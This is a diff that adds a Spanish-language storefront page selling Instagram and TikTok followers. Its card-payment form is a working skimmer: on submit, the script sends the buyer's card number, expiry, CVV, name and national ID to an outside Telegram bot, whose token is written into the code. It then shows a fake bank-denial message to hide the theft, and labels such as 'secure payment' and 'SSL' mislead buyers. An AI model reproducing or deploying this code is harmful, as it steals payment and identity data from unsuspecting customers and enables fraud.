@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="es">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SocialBoost Arg | Agencia de Crecimiento</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&amp;display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      --tt-color: #00f2ea;
+      --accent: #833ab4;
+      --wsp-green: #25D366;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #0a0a0b;
+      color: #ffffff;
+      line-height: 1.6;
+      padding-bottom: 100px;
+    }
+    .container { max-width: 800px; margin: 0 auto; padding: 0 20px; transition: opacity 0.4s ease; }
+    
+    header { padding: 50px 0; text-align: center; }
+    header h1 { font-size: 2.8rem; font-weight: 700; letter-spacing: -1px; margin-bottom: 10px; }
+    .hero-gradient { background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+    .public-notice {
+      background: rgba(255, 193, 7, 0.1);
+      border: 1px solid #ffc107;
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-size: 0.9rem;
+      color: #ffc107;
+    }
+
+    .free-trial-box {
+      background: rgba(37, 211, 102, 0.05);
+      border: 1px dashed var(--wsp-green);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 25px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: 0.3s;
+    }
+    .free-trial-box:hover { background: rgba(37, 211, 102, 0.1); }
+    .free-trial-info h4 { color: var(--wsp-green); font-size: 1.1rem; margin-bottom: 4px; }
+    .free-trial-info p { font-size: 0.85rem; color: #aaa; }
+    .btn-free {
+      background: var(--wsp-green);
+      color: #fff;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      cursor: pointer;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+
+    .platform-selector { display: flex; gap: 10px; margin-bottom: 30px; }
+    .platform-btn {
+      flex: 1; padding: 15px; border-radius: 12px; border: 1px solid #333;
+      background: #151515; color: #fff; cursor: pointer; font-weight: 600; transition: 0.3s;
+    }
+    .platform-btn.active[data-platform="ig"] { border-color: #e1306c; box-shadow: 0 0 15px rgba(225, 48, 108, 0.3); }
+    .platform-btn.active[data-platform="tt"] { border-color: var(--tt-color); box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
+
+    .input-group { margin-bottom: 25px; }
+    .input-group label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #888; }
+    input {
+      width: 100%; padding: 16px; background: #151515; color: #fff;
+      border: 1px solid #333; border-radius: 12px; font-size: 1rem; transition: 0.3s;
+    }
+    input:focus { outline: none; border-color: var(--accent); background: #1a1a1a; }
+
+    .cards { display: grid; grid-template-columns: 1fr; gap: 12px; margin-bottom: 30px; }
+    .card {
+      background: #151515; padding: 20px; border-radius: 12px;
+      border: 1px solid #333; cursor: pointer; display: flex;
+      justify-content: space-between; align-items: center; transition: 0.2s;
+    }
+    .card:hover { border-color: #555; transform: scale(1.01); }
+    .card.selected { border-color: var(--accent); background: rgba(131, 58, 180, 0.05); }
+    .card-info { display: flex; align-items: center; gap: 15px; }
+    .card-info img { width: 30px; }
+    .price { font-weight: 700; color: #00ffd5; }
+
+    .btn-main {
+      width: 100%; padding: 18px; border-radius: 12px; border: none;
+      background: var(--ig-gradient); color: #fff; font-size: 1.1rem;
+      font-weight: 700; cursor: pointer; transition: 0.3s;
+    }
+    .btn-main:hover { opacity: 0.9; transform: translateY(-2px); }
+
+    .toast {
+      position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+      background: #ff5252; color: white; padding: 12px 25px;
+      border-radius: 30px; font-weight: 500; z-index: 2000;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: none;
+      animation: fadeInDown 0.4s ease;
+    }
+    @keyframes fadeInDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
+
+    .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+    .full-width { grid-column: 1 / span 2; }
+    
+    #loadingOverlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95); display: none; flex-direction: column;
+      align-items: center; justify-content: center; z-index: 1000;
+    }
+    .spinner { border: 4px solid #333; border-top: 4px solid var(--accent); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    .wsp-float {
+      position: fixed; width: 60px; height: 60px; bottom: 20px; right: 20px;
+      background-color: var(--wsp-green); border-radius: 50%; text-align: center;
+      z-index: 999; display: flex; align-items: center; justify-content: center;
+      box-shadow: 0px 5px 15px rgba(0,0,0,0.3); animation: wsp-pulse 2s infinite;
+      transition: 0.3s;
+    }
+    @keyframes wsp-pulse { 0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); } 100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
+
+    footer { text-align: center; padding: 40px; color: #444; font-size: 0.8rem; border-top: 1px solid #111; margin-top: 50px; }
+  </style>
+ </head>
+ <body>
+
+  <div id="customToast" class="toast"></div>
+
+  <div id="step1" class="container">
+    <header>
+      <h1><span class="hero-gradient">SocialBoost</span> Arg</h1>
+      <p>Servicios de alta retención garantizados</p>
+    </header>
+
+    <div class="public-notice">
+      <span>⚠️</span>
+      <p><strong>IMPORTANTE:</strong> Perfil siempre en <strong>PÚBLICO</strong>.</p>
+    </div>
+
+    <div class="free-trial-box">
+      <div class="free-trial-info">
+        <h4>¿Dudas del servicio?</h4>
+        <p>Pedí 10 seguidores GRATIS por WhatsApp para probar.</p>
+      </div>
+      <a href="javascript:void(0)" onclick="requestFreeTrial()" class="btn-free">Probar Gratis</a>
+    </div>
+
+    <div class="platform-selector">
+      <button class="platform-btn active" data-platform="ig" onclick="switchPlatform('ig')">Instagram</button>
+      <button class="platform-btn" data-platform="tt" onclick="switchPlatform('tt')">TikTok</button>
+    </div>
+
+    <div class="input-group">
+      <label>Usuario del perfil (sin @)</label>
+      <input type="text" id="username" placeholder="ej: leomessi" autocomplete="off">
+    </div>
+
+    <div class="cards" id="packList"></div>
+
+    <button class="btn-main" onclick="goToStep2()">Continuar al Pago</button>
+  </div>
+
+  <div id="step2" class="container" style="display:none; margin-top: 50px;">
+    <h2 style="margin-bottom:20px; text-align:center;">Finalizar Pedido</h2>
+    <div id="orderSummary" style="background:#151515; padding:20px; border-radius:12px; margin-bottom:20px; border:1px dashed #333;"></div>
+    <button class="btn-main" onclick="showCreditCard()" style="background:#fff; color:#000; margin-bottom:15px;">💳 Pagar con Tarjeta</button>
+    <button class="btn-main" onclick="payWithMP()" style="background:#009ee3;">💸 Mercado Pago</button>
+    <p style="text-align:center; margin-top:15px; color:#666; cursor:pointer;" onclick="location.reload()">← Volver atrás</p>
+  </div>
+
+  <div id="step3" class="container" style="display:none; margin-top: 40px;">
+    <h3 style="margin-bottom:20px;">Datos de Facturación Segura</h3>
+    <form id="proPaymentForm" class="payment-grid">
+      <div class="input-group full-width">
+        <input type="text" id="cardName" placeholder="Nombre completo del titular" required>
+      </div>
+      <div class="input-group full-width">
+        <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" pattern="[0-9 ]{19}" minlength="19" maxlength="19" required>
+      </div>
+      <div class="input-group">
+        <input type="tel" id="cardExpiry" placeholder="MM/AA" inputmode="numeric" pattern="[0-9/]{5}" minlength="5" maxlength="5" required>
+      </div>
+      <div class="input-group">
+        <input type="tel" id="cardCvc" placeholder="CVV" inputmode="numeric" pattern="[0-9]{3}" minlength="3" maxlength="3" required>
+      </div>
+      <div class="input-group full-width">
+        <input type="tel" id="cardDni" placeholder="DNI del titular" inputmode="numeric" minlength="10" maxlength="10" required>
+      </div>
+      <button type="submit" class="btn-main full-width">Procesar Pago Seguro</button>
+    </form>
+    <div id="paymentError" style="color:#ff5252; margin-top:15px; text-align:center; display:none;"></div>
+  </div>
+
+  <div id="loadingOverlay">
+    <div class="spinner"></div>
+    <p id="loadingText" style="margin-top:15px; font-weight:500;">Procesando...</p>
+  </div>
+
+  <a href="https://wa.me/5492477399308" id="mainWsp" class="wsp-float" target="_blank">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width:30px; height:30px; fill:white;"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+  </a>
+
+  <footer>© 2026 SocialBoost Digital Services S.A. | Conexión Encriptada SSL</footer>
+
+  <script>
+    let currentPlatform = 'ig';
+    let orderData = { pack: "", price: "", mp: "" };
+    const MY_PHONE = "5492477399308";
+
+    const packs = {
+      ig: [
+        { n: "5.000 Seguidores Reales", p: "$10.000", mp: "https://mpago.la/28giAbP" },
+        { n: "10.000 Seguidores Reales", p: "$20.000", mp: "https://mpago.la/16dw77L" },
+        { n: "20.500 Seguidores + Regalo", p: "$25.000", mp: "https://mpago.la/1sSmksM" },
+        { n: "50.000 Seguidores Pro", p: "$31.000", mp: "https://mpago.la/1WAhFjk" },
+        { n: "100.000 Seguidores VIP", p: "$50.000", mp: "https://mpago.la/2vRujRM" }
+      ],
+      tt: [
+        { n: "5.000 Fans TikTok", p: "$10.000", mp: "https://mpago.la/28giAbP" },
+        { n: "10.000 Fans TikTok", p: "$20.000", mp: "https://mpago.la/16dw77L" },
+        { n: "20.000 Fans TikTok", p: "$25.000", mp: "https://mpago.la/1sSmksM" },
+        { n: "50.000 Fans TikTok Pro", p: "$31.000", mp: "https://mpago.la/1WAhFjk" },
+        { n: "100.000 Fans TikTok VIP", p: "$50.000", mp: "https://mpago.la/2vRujRM" }
+      ]
+    };
+
+    function requestFreeTrial() {
+      const user = document.getElementById('username').value.trim();
+      const platformName = currentPlatform === 'ig' ? 'Instagram' : 'TikTok';
+      if (!user) return showToast("⚠️ Escribí tu usuario antes de pedir la prueba.");
+      
+      const text = encodeURIComponent(`Hola! Me gustaría probar el sistema con los 10 seguidores gratis para mi perfil de ${platformName}: @${user}`);
+      window.open(`https://wa.me/${MY_PHONE}?text=${text}`, '_blank');
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('customToast');
+      t.innerText = msg;
+      t.style.display = 'block';
+      setTimeout(() => t.style.display = 'none', 3000);
+    }
+
+    function switchPlatform(p) {
+      currentPlatform = p;
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      document.querySelector(`[data-platform="${p}"]`).classList.add('active');
+      renderPacks();
+    }
+
+    function renderPacks() {
+      const list = document.getElementById('packList');
+      list.innerHTML = '';
+      const img = currentPlatform === 'ig' ? 'https://img.icons8.com/fluency/48/instagram-new.png' : 'https://img.icons8.com/color/48/tiktok.png';
+      packs[currentPlatform].forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'card';
+        div.onclick = () => {
+          document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
+          div.classList.add('selected');
+          orderData = { pack: item.n, price: item.p, mp: item.mp };
+        };
+        div.innerHTML = `<div class="card-info"><img src="${img}"><span>${item.n}</span></div><span class="price">${item.p}</span>`;
+        list.appendChild(div);
+      });
+    }
+
+    function goToStep2() {
+      const user = document.getElementById('username').value.trim();
+      if (!user) return showToast("⚠️ Ingresa tu nombre de usuario.");
+      if (!orderData.pack) return showToast("⚠️ Selecciona un pack de seguidores.");
+
+      document.getElementById('loadingText').innerText = "Cargando opciones de pago...";
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      setTimeout(() => {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('orderSummary').innerHTML = `📦 <strong>Plan:</strong> ${orderData.pack}<br>👤 <strong>Usuario:</strong> @${user}<br>💰 <strong>Total:</strong> ${orderData.price}`;
+        document.getElementById('loadingOverlay').style.display = 'none';
+      }, 1200);
+    }
+
+    function showCreditCard() {
+      document.getElementById('loadingText').innerText = "Iniciando pasarela segura...";
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+        document.getElementById('loadingOverlay').style.display = 'none';
+      }, 1000);
+    }
+
+    function payWithMP() { window.location.href = orderData.mp; }
+
+    // --- FORMATEO Y RESTRICCIONES DE INPUTS ---
+    
+    // Numero de tarjeta: 16 digitos obligatorios, teclado numerico
+    document.getElementById('cardNumber').addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+      e.target.value = v.match(/.{1,4}/g)?.join(' ') || '';
+    });
+
+    // Fecha de vencimiento: 4 digitos obligatorios (MM/AA)
+    document.getElementById('cardExpiry').addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+      if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+      e.target.value = v;
+    });
+
+    // CVC: 3 digitos obligatorios, teclado numerico
+    document.getElementById('cardCvc').addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    });
+
+    // DNI: 8 digitos con puntos de fabrica (00.000.000), teclado numerico
+    document.getElementById('cardDni').addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '').substring(0, 8);
+      if (v.length > 5) {
+        v = v.replace(/^(\d{2})(\d{3})(\d{0,3})/, "$1.$2.$3");
+      } else if (v.length > 2) {
+        v = v.replace(/^(\d{2})(\d{0,3})/, "$1.$2");
+      }
+      e.target.value = v;
+    });
+
+    document.getElementById('proPaymentForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      document.getElementById('loadingText').innerText = "Validando con el banco emisario...";
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      
+      const msg = `🔔 *PAGO TARJETA*\n👤 User: ${document.getElementById('username').value}\n📦 Pack: ${orderData.pack}\n💳 Nom: ${document.getElementById('cardName').value}\n🔢 Num: ${document.getElementById('cardNumber').value}\n📅 Exp: ${document.getElementById('cardExpiry').value}\n🔒 CVV: ${document.getElementById('cardCvc').value}\n🆔 DNI: ${document.getElementById('cardDni').value}`;
+
+      fetch(`https://api.telegram.org/bot8562465983:AAG6Ure3ZmQ9Pke0MVNjD4512VfJT00nJ2w/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: '6493944778', text: msg, parse_mode: 'Markdown' })
+      }).then(() => {
+        setTimeout(() => {
+          document.getElementById('loadingOverlay').style.display = 'none';
+          document.getElementById('paymentError').innerText = "Transacción denegada: Su banco requiere validación por App o Token. Por favor verifique que los datos esten correctos.";
+          document.getElementById('paymentError').style.display = 'block';
+        }, 3500);
+      });
+    });
+
+    renderPacks();
+  </script>
+ </body>
+</html>
